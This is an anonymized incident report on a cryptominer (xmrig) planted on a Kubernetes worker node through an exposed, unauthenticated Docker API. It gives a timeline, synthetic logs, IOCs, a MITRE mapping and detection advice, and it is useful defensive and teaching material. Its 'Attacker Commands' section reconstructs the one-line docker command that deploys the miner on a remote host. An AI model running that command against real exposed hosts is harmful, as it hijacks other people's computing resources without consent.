ğŸ›¡ Crypto Miner on Linux Container Host (Anonymized)
ğŸ“Œ Executive Summary

During log review, unusual CPU spikes were observed on a Kubernetes worker node.
Investigation revealed a crypto miner binary (xmrig) deployed via a misconfigured container.
The attacker exploited an exposed Docker API to deploy the container.

ğŸ¯ Outcome: resource hijacking detected, miner removed, exposure closed.

____________________________________________________________________________________________

---

ğŸ–¼ Attack Flow (ASCII Diagram)

+---------------------------+
| Exposed Docker API Port   |
+---------------------------+
             |
             v
+---------------------------+
| Attacker Deployed Malic.  |
| Container (xmrig)         |
+---------------------------+
             |
             v
+---------------------------+
| High CPU Usage            |
| & Outbound Pool Traffic   |
+---------------------------+
             |
             v
+---------------------------+
| SOC Alert â†’ Investigation |
+---------------------------+
             |
             v
+---------------------------+
| Container Removed, Port   |
| Secured                   |
+---------------------------+

---

____________________________________________________________________________________________

ğŸ“– Attack Narrative
ğŸ¥· Stage 1 â€“ Initial Access

Attacker scanned for exposed Docker API (port 2375).

Found unauthenticated API endpoint on worker node.

ğŸ›  Stage 2 â€“ Execution

Deployed a container running xmrig from public Docker Hub image.

Miner executed immediately, consuming high CPU.

ğŸ“¡ Stage 3 â€“ Persistence & Impact

Outbound traffic to Monero mining pool detected.

Host performance degraded â†’ SOC triggered anomaly alert.

ğŸ›¡ Stage 4 â€“ Response

IR team confirmed miner in container logs.

Container removed, exposed port firewalled.

Post-mortem conducted with Kubernetes audit logs.

____________________________________________________________________________________________

â±ï¸ Timeline (UTC)
Time	Event
02:41	ğŸ“Š Metrics show CPU usage 95% on worker node
02:44	ğŸŒ Netflow reveals outbound to mining pool (port 3333)
02:50	ğŸ” Analyst confirms xmrig binary inside container
03:05	ğŸ›‘ Malicious container killed; Docker API closed
03:30	ğŸ“‘ Post-mortem; Kubernetes audit logs reviewed

____________________________________________________________________________________________

ğŸ”‘ Key Findings

ğŸ”“ Docker API exposed to internet without authentication.

ğŸ³ Miner image (xmrig/xmrig:latest) pulled from public registry.

ğŸ“¡ Traffic to Monero mining pool pool.minexmr.example:3333.

____________________________________________________________________________________________

ğŸ—‚ï¸ MITRE ATT&CK Mapping

T1190 â€“ Exploit Public-Facing Application (Docker API)

T1496 â€“ Resource Hijacking (Crypto Mining)

T1105 â€“ Ingress Tool Transfer (Pulling xmrig image)

____________________________________________________________________________________________

ğŸ“‚ Artifacts (Synthetic / Anonymized)

{
  "time": "2025-07-12T02:41:22Z",
  "metric": "cpu_usage",
  "value": "95%",
  "container_id": "3f2c9d8c5ab2",
  "image": "xmrig/xmrig:latest"
}

{
  "time": "2025-07-12T02:44:10Z",
  "eventSource": "netflow",
  "srcIP": "10.10.45.12",
  "dstIP": "185.203.116.45",
  "dstPort": 3333,
  "protocol": "TCP",
  "action": "ALLOW"
}

{
  "time": "2025-07-12T02:50:01Z",
  "eventSource": "docker.logs",
  "container": "xmrig",
  "message": "[+] Mining at pool.minexmr.example:3333 using 4 threads"
}

____________________________________________________________________________________________

ğŸ’» Attacker Commands (Reconstructed, Synthetic)

# ğŸš€ Deploy malicious container
docker -H tcp://0.0.0.0:2375 run -d --name miner xmrig/xmrig:latest

# â›ï¸ Miner process observed inside container
ps aux | grep xmrig

# ğŸ“¡ Mining traffic to external pool
netstat -anp | grep 3333

____________________________________________________________________________________________

ğŸ§¾ IOCs (Synthetic)

| Type      | Value                      | Source           | Status     |
| --------- | -------------------------- | ---------------- | ---------- |
| ğŸŒ IP     | 185.203.116.45             | Netflow          | Malicious  |
| ğŸ”— Domain | pool.minexmr.example       | Container logs   | Malicious  |
| ğŸ³ Image  | xmrig/xmrig\:latest        | Docker pull logs | Malicious  |
| âš™ï¸ Port   | 2375 (Docker API, exposed) | Infra config     | Vulnerable |

____________________________________________________________________________________________

ğŸ‘€ Detection Use Cases

ğŸš¨ Alert on containers pulling images from untrusted registries.

ğŸš¨ Monitor abnormal CPU/GPU spikes per container.

ğŸŒ Detect outbound traffic to known crypto mining pools.

____________________________________________________________________________________________

ğŸ›¡ï¸ Response Actions

âŒ Terminated malicious container.

ğŸ”’ Firewalled Docker API port 2375.

ğŸ—‘ Removed cached miner image.

ğŸ“‘ Reviewed Kubernetes audit logs for persistence.

____________________________________________________________________________________________

ğŸ›¡ï¸ Recommendations

ğŸ” Restrict Docker API access (bind to localhost / use TLS).

ğŸ§‘â€ğŸ’» Require authentication for container deployments.

ğŸ›¡ Build SIEM detections for miner indicators.

ğŸ”„ Regular patching and review of Kubernetes worker node exposure.
